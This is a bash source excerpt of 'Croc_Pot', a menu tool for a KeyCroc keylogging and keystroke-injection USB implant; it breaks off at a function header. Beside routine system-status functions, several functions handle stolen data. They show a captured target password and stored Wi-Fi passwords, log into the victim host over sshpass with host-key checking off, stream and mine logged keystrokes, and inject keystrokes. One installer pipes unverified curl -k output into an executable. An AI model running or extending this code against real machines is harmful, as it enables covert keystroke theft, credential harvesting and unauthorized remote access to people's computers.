	screenfetch 2>/dev/null
	echo -ne "\e[48;5;202;30m$LINE$clear\n"
	local server_name="$(hostname)"
memory_check() {
	printf '\033[H\033[2J'
	(croc_title_loot "MEMORY STATUS ON ${server_name^^}"
	ColorYellow "$(df -h | xargs | awk '{print "Free/total disk: " $11 " / " $9}')$clear\n$LINE
	$(grep -E --color=auto 'Mem|Cache|Swap' /proc/meminfo)\n$LINE\n$(free -t -m)\n$LINE
	$(cat /proc/meminfo)\n$LINE\n$(vmstat)\n$LINE\n$(df -h)\n$LINE\n$(lsblk)\n$LINE
$(for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do
	count=$(find "/$dir" -type f 2>/dev/null | wc -l)
	if [ $? -eq 0 ]; then
	ColorYellow "Directory:$(ColorCyan " /$dir ")$(ColorYellow 'Contains:')$(ColorGreen " $count ")$(ColorYellow 'files.')\n"
	fi
done)"
	echo "$LINE") | tee "$LOOT_INFO"
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
}
cpu_check() {
	printf '\033[H\033[2J'
	(croc_title_loot "CPU STATUS ON ${server_name^^}"
	ColorYellow "$clear$(more /proc/cpuinfo && lscpu | grep MHz --color=auto)\n$LINE\n$(lscpu | grep -E 'Model name|Socket|Thread|NUMA|CPU\(s\)')\n$LINE
	Threads/core: $(nproc --all)\n$LINE\nNumber of CPU/cores online at $HOSTNAME: $(getconf _NPROCESSORS_ONLN)\n$LINE
	CPU TEMP: $(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE: $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')\n"
	echo "$LINE") | tee -a "$LOOT_INFO"
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
}
tcp_check() {
	printf '\033[H\033[2J'
	install_package speedtest-cli SPEEDTEST-CLI
	(croc_title_loot "NETWORK STATUS ON ${server_name^^}"
	ColorYellow "$clear$(netstat -l)\n$LINE\n$(netstat -r)\n$LINE\n$( netstat -tunlp)\n$LINE\n$(iw dev wlan0 link)\n$LINE
	$(iw wlan0 scan | grep -E --extended-regexp 'BSS ([[:xdigit:]]{1,2}:)|signal: |SSID: |\* Manufacturer: |\* Model Number: |\* Serial Number: |\* Device name: ' )\n$LINE
	$(arp -a -e -v)\n$LINE\n$(ss -p -a)\n$LINE\n$(for interface in $(ls /sys/class/net/); do echo -ne "${interface}\n"; done)\n$LINE
	$(/sbin/ifconfig -a)\n$LINE\n$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com)\n$LINE\n$(speedtest)"
	echo "$LINE") | tee -a "$LOOT_INFO"
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
}
kernel_check() {
	printf '\033[H\033[2J'
	(croc_title_loot "KERNEL STATUS ON ${server_name^^}"
	ColorYellow "$clear$(uname --all)\n$LINE\n$(hostnamectl)\n$LINE\n$(cat /proc/version)\n"
	echo "$LINE") | tee -a "$LOOT_INFO"
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
}
processes_check() {
	printf '\033[H\033[2J'
	(croc_title_loot "PROCESSES STATUS ON ${server_name^^}"
	ColorYellow "Last logins: $clear
	$(last -a | head -3)\n$LINE\nRunning Processes $server_name is:\n$LINE
	$(ps -aux)\n$LINE\n$(service --status-all)\n$LINE\n$(findmnt -A)
	$(usb-devices)\n"
	echo "$LINE") | tee -a "$LOOT_INFO"
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
}
##
#----Status check all KeyCroc info
##
all_checks() {
	printf '\033[H\033[2J'
	(croc_title_loot "ALL CHECK STATUS ON ${server_name^^}"
echo -ne "\t${LINE_}KEYCROC INFO${LINE_}\n${LINE}\nCROC FIRMWARE: $(cat /root/udisk/version.txt)\nKEYCROC CONFIG SETTING:\n$(sed -n '/^[DWS]/p' /root/udisk/config.txt)\n${LINE}\nUSER NAME: $(whoami)\nHOSTNAME: $(cat /proc/sys/kernel/hostname)
IP: $(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-) $(ifconfig eth0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)\nPUBLIC IP: $(curl ifconfig.co)\nMAC ADDRESS: $(ip -o link | awk '$2 != "lo:" {print $2, $(NF-2)}')\n${LINE}\nVARIABLES CURRENT USER:\n$(env)\n${LINE}\n
INTERFACE: $(ip route show default | awk '/default/ {print $5}')\nMODE: $(cat /tmp/mode)\nSSH: root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)\nDNS: $(sed -n -e 4p /etc/resolv.conf)\nDNS: $(sed -n -e 5p /etc/resolv.conf)\nDISPLAY ARP: $(ip n)\n${LINE}\nROUTE TALBE: $(ip r)\nNETWORK:\n$(ifconfig -a)\n${LINE}\nSYSTEM UPTIME: $(uptime)\n
SYSTEM INFO: $(uname -a)\n${LINE}\nUSB DEVICES:\n$(usb-devices)\n${LINE}\nBASH VERSION:\n$(apt-cache show bash)\n${LINE}\nLINUX VERSION:\n$(cat /etc/os-release)\n${LINE}\nSSH KEY:\n$(ls -al ~/.ssh)\n$(cat ~/.ssh/id_rsa.pub)\n${LINE}\n
MEMORY USED:\n$(free -m)\n$(cat /proc/meminfo)\n${LINE}\nSHOW PARTITION FORMAT:\n$(lsblk -a)\n${LINE}\nSHOW DISK USAGE:\n$(df -TH)\n\t${LINE_A}>MORE DETAIL<${LINE_A}\n$(fdisk -l)\n${LINE}\nCHECK USER LOGIN:\n$(lastlog)\n${LINE}\nCURRENT PROCESS:\n$(ps aux)\n${LINE}\nCPU INFORMATION:\n$(more /proc/cpuinfo)\n$(lscpu | grep MHz)\n${LINE}\nCHECK PORT:\n$(netstat -tulpn)\n
${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES:\n$(dpkg-query -l)\n${LINE}\nIDENTIFIER (UUID):\n$(blkid)\n${LINE}\nDIRECTORIES:\n$(ls -la -r /etc /var /root /tmp /usr /sys /bin /sbin)\n${LINE}\nDISPLAY TREE:\n$(pstree)\n${LINE}\nSHELL OPTIONS:\n$(shopt)\n${LINE}\n$(CHECK_PAYLOADS)\n${LINE}\n"
	curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com ; echo "$LINE") | tee "$LOOT_INFO"
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
}
##
#----Status of target info loot from Croc_Pot_Payload scan
##
pc_info() {
	printf '\033[H\033[2J'
	local TARGET_USERNAME=$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
	local CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
	local CROC_OS_TARGET=/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
if [ "$(OS_CHECK)" = WINDOWS ]; then
	(croc_title_loot 'TARGET INFO'
	ColorYellow "KeyCroc is pluged into: $(ColorGreen "$(OS_CHECK)")
	$(ColorYellow 'Target Host name: ')$(ColorGreen "$(sed -n 3p $CROC_OS)")
	$(ColorYellow 'Target Passwd: ')$(ColorGreen "$(target_pw)")
	$(ColorYellow 'Target user name: ')$(ColorGreen "$(sed -n 1p $CROC_OS_TARGET)")
	$(ColorYellow 'Target IP: ')$(ColorGreen "$(sed '2,6!d' $CROC_OS_TARGET)")
	$(ColorYellow 'Target SSID + PASSWD and MAC address:')
	$(ColorGreen "$(sed '9,24!d' $CROC_OS_TARGET)")\n"
	sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'powershell -Command "& {Get-ChildItem -Recurse | ?{ $_.PSIsContainer } | Select-Object FullName, ` @{Name=\"FileCount\";Expression={(Get-ChildItem $_ -File | Measure-Object).Count }}}"' 2>/dev/null
	sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'powershell -Command "& {systeminfo}"'
	echo "$LINE") | tee "$LOOT_INFO"
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
elif [ "$(OS_CHECK)" = LINUX ]; then
	(croc_title_loot 'TARGET INFO'
	ColorYellow "KeyCroc is pluged into: $(ColorGreen "$(OS_CHECK)")
	$(ColorYellow 'Target Host name: ')$(ColorGreen "$(sed -n 3p $CROC_OS)")
	$(ColorYellow 'Target Passwd: ')$(ColorGreen "$(target_pw)")
	$(ColorYellow 'Target user name: ')$(ColorGreen "$(sed -n 1p $CROC_OS_TARGET)")
	$(ColorYellow 'Target IP: ')$(ColorGreen "$(sed '2,3!d' $CROC_OS_TARGET)")
	$(ColorYellow 'Target SSID + PASSWD and MAC address:')
	$(ColorGreen "$(sed '4,20!d' $CROC_OS_TARGET)")\n"
	sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'hostnamectl ; echo "'"${LINE}"'" ; netstat -r ; echo "'"${LINE}"'"'
	sshpass -p "$(target_pw)" ssh -o "StrictHostKeyChecking no" "$TARGET_USERNAME"@"$(os_ip)" 'for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do count=$(find "/$dir" 2>/dev/null | wc -l); if [ $? -eq 0 ]; then printf "'"$yellow"'Directory: '"$cyan"'/%s'"$yellow"' Contains: '"$green"'%s'"$yellow"' files.'"$clear"'\n" "$dir" "$count"; fi; done'
	echo "$LINE") | tee "$LOOT_INFO"
	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" "$LOOT_INFO"
else
	ColorRed '\nPLEASE RUN CROC_POT PAYLOAD TO GET TARGET USER NAME AND IP\n'
fi
if [ -f /root/udisk/tools/Croc_Pot/Target_File_Structure.txt ]; then
	ColorYellow "Target File Structure:" ; sleep 2
	cat /root/udisk/tools/Croc_Pot/Target_File_Structure.txt | more
fi
}
##
#----Status keystrokes croc_char.log file menu/function
##
key_file() {
	Info_Screen '-Keycroc loot/croc_char.log file
-Scan loot/croc_char.log for match word/pattern
-View live keystrokes'
	keyboard_check
	ColorYellow "Currently found $(ColorGreen "$(find . -type f -name "croc_char.log" -exec cat {} + | wc -m)")$(ColorYellow ' characters in croc_char.log')\n\n"
##
#----View Live keystrokes
##
keystrokes_V() {
	Info_Screen '-View Live keystrokes
-PRESS CONTROL + C TO EXIT live keylog'
	read_all 'Start tail the log file: loot/croc_char.log Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			trap 'ColorYellow "\n\nYou have exited the log tail and returned to the main menu." && return' SIGINT
			ColorYellow "Waiting for keyboard activity"
			WAIT_FOR_KEYBOARD_ACTIVITY 0
			printf '\033[H\033[2J'
			ColorYellow '\n\t\tkeystrokes will display here\n'
			tail -f loot/croc_char.log
			trap - SIGINT ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Check keycroc keystroke log file (loot/croc_char.log) for match word/pattern
##
word_check() {
	Info_Screen '-Scan keystroke log file at loot/croc_char.log For match word/pattern
-Enter match word/pattern'
	read_all 'START MATCH WORD/PATTERN SCAN Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			read_all 'ENTER WORD/PATTERN AND PRESS [ENTER]' ; local M_W="$r_a"
			find . -type f -name "croc_char.log" -exec cat {} + > /tmp/combined_logs.txt
			if [ "$(cat /tmp/combined_logs.txt | sed -n 's/.*\('"$M_W"'\).*/\1/p')" = "$M_W" ]; then
				ColorYellow 'Found match word/pattern in loot/croc_char.log\n'
				ColorGreen "$M_W$(ColorYellow ' count: ')$(ColorGreen "$(grep -o "$M_W" /tmp/combined_logs.txt | wc -w)")\n"
			else
				ColorYellow 'Did not find match word/pattern in loot/croc_char.log\n'
				ColorRed "$M_W\n"
			fi 2>/dev/null ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Check keycroc keystroke log file (loot/croc_char.log) with word list
##
list_check() {
	Info_Screen '-Scan keystroke log file at loot/croc_char.log For match word/pattern
with word list'
	install_package wamerican-huge AMERICAN_WORDLIST
	read_all 'START MATCH WORD-LIST SCAN Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			ColorYellow 'Enter the full path of word list or use /usr/share/dict/american-english-huge\n'
			read_all 'ENTER FULL PATH OF WORD LIST LOCATION AND PRESS [ENTER]'
			if [ -f "$r_a" ]; then
				ColorYellow 'Word list was located\n'
				local WORDFILE="$r_a"
			else
				invalid_entry ; ColorRed 'Did not find Word list please try again\n'
			fi
			reset_broken
			find . -type f -name "croc_char.log" -exec cat {} + > /tmp/combined_logs.txt
			while [ "$broken" -eq 1 ] && break || IFS= read -r; do
				if [ "$REPLY" = "$(sed -n 's/.*\('"$REPLY"'\).*/\1/p' /tmp/combined_logs.txt)" ]; then
					ColorYellow 'Found match word/pattern in loot/croc_char.log\n'
					ColorGreen "$REPLY$(ColorYellow ' count: ')$(ColorGreen "$(grep -o $REPLY /tmp/combined_logs.txt | wc -w)")\n"
				else
					ColorYellow 'Did not find match word/pattern in loot/croc_char.log\n'
					ColorRed "$REPLY\n"
				fi 2>/dev/null
			done < "$WORDFILE" ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----View keycroc loot/croc_char.log file
##
view_key() {
	Info_Screen '-View Key croc keystroke log file
[C]- croc_char.log
[R]- croc_raw.log
[M]- matches.log
[Q]- QUACK.log
[H]- hotplug.log
[A]- attackmode.log
[F]- Filtered croc_char.log
[N]- Match pattern count'
 
	read_all 'VIEW LOG FILES Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			read_all '[C]-char [R]-raw [M]-matches [Q]-QUACK [H]-hotplug [A]-attackmode\n [F]- Filtered croc-char [N]- Match pattern'
			process_logs() {
				local log_name="$1"
				find . -type f -name "$log_name" -print0 | while IFS= read -r -d '' file; do
					ColorYellow "File: $(ColorCyan "$file")\n"
					ColorYellow "$log_name: $(ColorCyan "$(cat $file | wc -m)")\n"
					ColorGreen "$(cat $file)"
					ColorRed "\n$LINE\n"
					sleep .5
				done
			}
			case "$r_a" in
				[cC])
					process_logs "croc_char.log" ;;
				[rR])
					process_logs "croc_raw.log" ;;
				[mM])
					process_logs "matches.log" ;;
				[qQ])
					process_logs "QUACK.log" ;;
				[hH])
					process_logs "hotplug.log" ;;
				[aA])
					process_logs "attackmode.log" ;;
				[fF])
					find . -type f -name "croc_char.log" -print0 | while IFS= read -r -d '' file; do
						ColorYellow "File: $(ColorCyan "$file")\n"
						log_char_count=$(sed 's/\[[^]]*\]//g' "$file" | wc -m)
						ColorYellow "Character Count: $(ColorCyan "$log_char_count")\n"
						ColorGreen "$(sed 's/\[[^]]*\]//g' "$file")"
						ColorRed "\n$LINE\n"
						sleep .5
					done ;;
				[nN])
					content=$(find . -type f -name "croc_char.log" -exec cat {} +)
					patterns=$(echo "$content" | grep -oE '(\w+|\[[^]]*\]|\([^)]*\)|\{[^}]*\}|[][(){}<>?@#\$%^&*\-=+\\|/.,:;"'\''!]+)' | awk '{count[$1]++} END {for(pattern in count) print count[pattern], pattern}' | sort -nr)
					ColorYellow "Patterns sorted by frequency:\n"
					echo "$patterns"
					ColorYellow "$LINE"
					find . -type f -name "croc_char.log" -exec sed 's/\[[^]]*\]//g' {} + | \
					awk 'length($0) >= 3 { 
						for(i=1; i<=length($0)-2; i++) { 
							for(j=i+2; j<=length($0) && j-i+1<=16; j++) { 
								print substr($0, i, j-i+1)
								}
							}
						}' | \
					sort | uniq -c | \
					awk '$1 > 1 {print $1, $2}' | \
					sort -nr ;;
				*)
					invalid_entry ;;
			esac ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Function to handle back up the "/root/udisk/loot" directory to "/tmp/loot_backup" and clean it
##
clean_log() {
	Info_Screen 'Back up the /root/udisk/loot directory 
to /tmp/loot_backup and clean it.
NOTE: This will remove all folders in loot folder.'
	cd /root/udisk/loot && ls -la
	read_all 'BACKUP & CLEAN KEYCROC LOOT DIRECTORY Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			# Check if the source directory exists
			if [ ! -d "$source_dir" ]; then
				ColorRed "Error: Source directory $source_dir does not exist.\n"
				return
			fi
			# Create the backup directory if it does not exist
			if [ ! -d "$backup_dir" ]; then
				ColorYellow "Creating backup directory $backup_dir...\n"
				mkdir -p "$backup_dir"
			fi
			# Copy the entire contents of the "/root/udisk/loot" directory to the backup directory
			ColorYellow "Backing up $source_dir to $backup_dir...\n"
			cp -r "$source_dir"/* "$backup_dir"
			# Check if the copy was successful
			if [ $? -eq 0 ]; then
				ColorGreen "Backup successful!\n"
				# Clean (delete) all files and subdirectories inside "/root/udisk/loot"
				ColorYellow "Cleaning up the $source_dir directory...\n"
				rm -rf "$source_dir"/*
				# Check if the clean-up was successful
				if [ $? -eq 0 ]; then
					ColorGreen "Clean-up successful! All files in $source_dir have been deleted.\n"
				else
					ColorRed "Failed to clean the $source_dir directory.\n"
				fi
			else
				ColorRed "Backup failed. No files were copied.\n"
			fi ;;
		[nN] | [nN][oO])
			ColorYellow "Maybe next time\n" ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Converts an input string containing alphanumeric characters to binary, hex, key-code, Unicode, octal, URL encoded, Base64 encoded
##
Convert_input() {
	Info_Screen 'The code reads a single character at a time from user input.
For each character:
  It calculates the ASCII value.
  Converts the ASCII value to binary, hex, key code, Unicode, octal,
  URL-encoded, and Base64 representations.

The code outputs the calculated representations for each character.
PRESS CTRL + C to break loop in terminal.'
	read_all 'START CONVERT INPUT Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			reset_broken
			while [ "$broken" -eq 1 ] && break || read -r -n 1 input_string; do
				binary=""
				hex=""
				key_code=""
				unicode=""
				octal=""
				url_encoded=""
				base64_encoded=""
				if [[ $input_string == $'\e' ]]; then
					key_combination=""
					read -rsn 2 input_string
					key_combination+="$input_string"
				else
					for (( i=0; i<${#input_string}; i++ )); do
						char=${input_string:i:1}
						ascii=$(printf "%d" "'$char")
						for (( j=7; j>=0; j-- )); do
							bit=$(( (ascii >> j) & 1 ))
							binary+="$bit"
						done
						binary+=" "
						hex+="$(printf "%02x" "$ascii") "
						key_code+="$(printf "%d" "'$char") "
						unicode+="\u$(printf "%04x" "$ascii") "
						octal+="\\$(printf "%03o" "$ascii") "
						url_encoded+="$(printf "%%%02x" "$ascii")"
						base64_encoded+=$(printf "%s" "$char" | base64)
					done
				fi
				echo -ne " ${yellow}Binary:${cyan}$binary${yellow}Hex:${cyan}$hex${yellow}Key-code:${cyan}$key_code${yellow}Unicode:$clear" ; echo -n "$unicode" ; echo -ne "${yellow}Octal:${cyan}$octal${yellow}URL:${cyan}$url_encoded${yellow} Base64:${cyan}$base64_encoded$clear\n"
			done ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----QUACK TEST, test keycroc keystroke injection
##
quack_test() {
	Info_Screen 'Test keycroc keystroke injection
QUACK TEST:
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-10-8-7-6-5-4-3-2-1!@#$%^&

Window run in notepad
Linux run in terminal'
	TEST_QUACK() {
		for test_quack in {a..z} {A..Z} {-10..-1} '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '_' '+' '=' '[' ']' '\\' ';' ':' '\"' '<' ',' '>' '.' '?' '\/'; do
			QUACK STRING "$test_quack"
			ColorYellow "$test_quack"
		done
		ColorGreen 'Test is complete\n' ; sleep 5
	}
	read_all 'START QUACK TEST Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			if [ "$(OS_CHECK)" = WINDOWS ]; then
				QUACK GUI m ; QUACK GUI r ; QUACK DELAY 2000 ; QUACK STRING "notepad" ; QUACK ENTER ; QUACK DELAY 5000
				TEST_QUACK && QUACK CONTROL-a ; QUACK BACKSPACE ; QUACK ALT-F4
			elif [ "$(OS_CHECK)" = LINUX ]; then
				case "$HOST_CHECK" in
					raspberrypi)
						QUACK CONTROL-ALT-d ; QUACK CONTROL-ALT-t ; QUACK DELAY 2000
						TEST_QUACK && QUACK ENTER ; QUACK STRING "exit" ; QUACK ENTER ;;
					"$HOST_CHECK")
						QUACK CONTROL-ALT-d ; QUACK ALT-t ; QUACK DELAY 2000
						TEST_QUACK && QUACK ENTER ; QUACK STRING "exit" ; QUACK ENTER ;;
					*)
						TEST_QUACK && QUACK ENTER ; QUACK STRING "exit" ; QUACK ENTER ;;
				esac
			else
				TEST_QUACK && QUACK ENTER ; QUACK STRING "exit" ; QUACK ENTER
			fi ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----keycroc loot/croc_char.log menu
##
	MenuTitle 'LOOT/CROC CHAR.LOG MENU'
	MenuColor 21 1 'VIEW LIVE KEYSTROKES'
	MenuColor 21 2 'MATCH WORD SCAN'
	MenuColor 21 3 'MATCH WORD LIST SCAN'
	MenuColor 21 4 'PREVIOUS KEYSTROKES'
	MenuColor 21 5 'CLEAN LOOT FOLDER'
	MenuColor 21 6 'CONVERT INPUT'
	MenuColor 21 7 'QUACK TEST'
	MenuColor 21 8 'RETURN TO MAIN MENU'
	MenuEnd 20
	case "$m_a" in
		1) keystrokes_V ; trap - SIGINT ; key_file ;;
		2) word_check ; key_file ;;
		3) list_check ; key_file ;;
		4) view_key ; key_file ;;
		5) clean_log ; key_file ;;
		6) Convert_input ; key_file ;;
		7) quack_test ; key_file ;;
		8) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; key_file ;;
		[pP]) Panic_button ;; [bB]) menu_A ;; *) invalid_entry ; key_file ;;
	esac
}
##
#----Status nmon monitoring system
##
nmon_system() {
	Info_Screen '-nmon is short for Nigels performance Monitor for Linux
-More details at http://nmon.sourceforge.net/pmwiki.php'
	install_package nmon NMON_MONITORING
	read_all 'START NMON MONITOR Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			nmon ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Status list all match words in payloads Option to change MATCH word
##
list_match() {
	Info_Screen '-List all MATCH words in payloads folder
-Option to change MATCH words
-View installed payloads'
	ColorYellow "CURRENTLY INSTALLED PAYLOADS: $(ColorGreen "$(ls /root/udisk/payloads | grep ".txt" | wc -l)")\n"
	ColorCyan "$(ls /root/udisk/payloads | grep ".txt")\n"
	CHECK_PAYLOADS
	echo -ne "\e[48;5;202;30m${LINE}${clear}\n\n"
	if [ "$(OS_CHECK)" = WINDOWS ]; then
		grep MATCH* /root/udisk/payloads/*.txt
	elif [ "$(OS_CHECK)" = LINUX ]; then
		grep MATCH* --color=auto /root/udisk/payloads/*.txt
	fi
	read_all 'CHANGE MATCH WORD FOR PAYLOAD Y/N AND PRESS [ENTER]' ; p_l="$r_a"
	case "$p_l" in
	[yY] | [yY][eE][sS])
		read_all 'ENTER THE PAYLOAD NAME TO CHANGE MATCH WORD AND PRESS [ENTER]' ; name_change="$r_a"
		if [ -f "/root/udisk/payloads/${name_change}.txt" ]; then
			R_M=$(cat /root/udisk/payloads/"$name_change.txt" | grep MATCH | awk '{print $2}')
			ColorYellow "Current Match word is $(ColorGreen "$R_M")\n"
			read_all 'ENTER NEW MATCH WORD AND PRESS [ENTER]' ; m_w="$r_a"
			sed -i "/MATCH$/!{s/$R_M/$m_w/}" /root/udisk/payloads/"$name_change.txt"
			grep MATCH* --color=always /root/udisk/payloads/"$name_change.txt"
		else
			invalid_entry
		fi ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
	esac
}
##
#----Status check local weather
##
check_weather() {
	Info_Screen '-Check local weather
-Author: Igor chubin https://github.com/chubin/wttr.in'
	curl wttr.in ; sleep 5
	curl v2.wttr.in/ ; sleep 5
	curl wttr.in/moon ; sleep 5
}
##
#----Status "top" An Information-Packed Dashboard display useful information about your system
##
top_croc() {
	Info_Screen '-top An Information-Packed Dashboard
-Press Q to exit top.

The third line displays the following central processing unit [CPU] values:
-us: Amount of time the CPU spends executing processes for people in user space
-sy: Amount of time spent running system [ kernel space ] processes
-ni: Amount of time spent executing processes with a manually set nice value
-id: Amount of CPU idle time.
-wa: Amount of time the CPU spends waiting for I/O to complete.
-hi: Amount of time spent servicing hardware interrupts.
-si: Amount of time spent servicing software interrupts.
-st: Amount of time lost due to running virtual machines [ steal time ].

The column headings in the process list are as follows:
-PID: Process ID.
-PR: Process priority.
-NI: The nice value of the process.
-VIRT: Amount of virtual memory used by the process.
-RES: Amount of resident memory used by the process.
-SHR: Amount of shared memory used by the process.
-S: Status of the process. [See the list below for the values field can take].
-%CPU: The share of CPU time used by the process since the last update.
-%MEM: The share of physical memory used.
-TIME+: Total CPU time used by the task in hundredths of a second.

-COMMAND: The command name or command line [ name + options ].
The status of the process can be one of the following:
-D: Uninterruptible sleep
-R: Running
-S: Sleeping
-T: Traced [ stopped ]
-Z: Zombie

Scrolling the Display:
-You can press the Up or Down Arrows, Home, End, and Page Up or Down keys
to move up and down and access all the processes.
Changing the Numeric Units:
-We pressed E to set the dashboard memory units to gibibytes and [ e ]
to set the process list memory units to mebibytes.

Changing the Summary Contents:
-Press [ l ] to toggle the load summary line [the first line] on or off.
-Press [ t ] to swap the CPU displays show the percentage of usage for each CPU
-Press [ m ] to cycle the memory and swap memory lines.
-Press [ 1 ] to change the display and see individual statistics for each CPU.
Color and Highlighting:
-Press [ z ] to add color to the display.
-Press [ y ] to highlight running tasks in the process list.
-Press [ x ] highlights the column used to sort the process list.

Sorting by Columns sort column by pressing the following:
-P: The %CPU column.
-M: The %MEM column.
-N: The PID column.
-T: The TIME+ column.

See the Full Command Line:
-Press [ c ] toggles the COMMAND column between displaying the process name.
-Press [ V ] To see a tree of processes that were launched.
See Processes for a Single User:
-Press [ u ] to see processes for a single user. Prompted for the name or UID.
Only See Active Tasks:
-Press [ l ]to see only active tasks.
Set How Many Processes to Display:
-Press [ n ]to limit the display to a certain number of lines.
Renice a Process:
-Press [ r ] to change the nice value [priority] for a process.
Kill a Process:
-Press [ k ] to kill a process. Be prompted for the process ID you want to kill

Alternative Display Mode:
-Works best in full-screen mode. Press A display four areas in the process list
and then press [ a ] to move from area to area.

Other Keystrokes:
-W: Save your settings and customizations.
-d: Set a new display refresh rate.
-Space: Force top to refresh its display right now.'
	read_all 'START TOP Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			top ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Cheat sheet by chubin https://github.com/chubin/cheat.sh
##
cheat_sheet() {
	Info_Screen '-Access to the best community driven cheat sheets repositories of the world.
-Has a simple curl/browser/editor interface
-Author: chubin https://github.com/chubin/cheat.sh
-INSTALL: curl -k https://cht.sh/:cht.sh | tee /usr/local/bin/cht.sh
-This will edit the original cht.sh to add curl -k option
-Note: The package rlwrap is a required dependency to run in shell mode.
-Press Q to exit current search
-Type exit to return back to Croc_Pot menu
-Full read me and how to at https://github.com/chubin/cheat.sh'
##
#----Install Cheat sheet to /usr/local/bin/cht.sh
##
	install_package rlwrap RLWRAP
	if [ -e /usr/local/bin/cht.sh ]; then
		ColorGreen 'Cheat sheet is installed at /usr/local/bin/cht.sh\n'
	else
		read_all 'INSTALL CHEAT SHEET Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				curl -k https://cht.sh/:cht.sh | tee /usr/local/bin/cht.sh
				chmod +x /usr/local/bin/cht.sh
				sed -i 's/curl -s/curl -k -s/g' /usr/local/bin/cht.sh
				sed -i 's/curl "$b_opts"/curl -k "$b_opts"/g' /usr/local/bin/cht.sh ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	fi
##
#----Start Cheat sheet cht.sh --shell
##
	read_all 'START CHEAT SHEET Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			cht.sh --shell ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Install/run iptraf-ng network monitoring tool
##
iptraf_ng() {
	Info_Screen '-Using Iptraf, we can monitor IP traffic passing over
the network. Display the general and detailed network interface 
statistics,incoming and outgoing packets of TCP/UDP service etc
-https://github.com/iptraf-ng
-Install will be apt install iptraf-ng
-To Start type iptraf-ng'
	install_package iptraf-ng IPTRAF_NG
	read_all 'START IPTRAF-NG Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			iptraf-ng ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Status Menu
##
menu_A() {
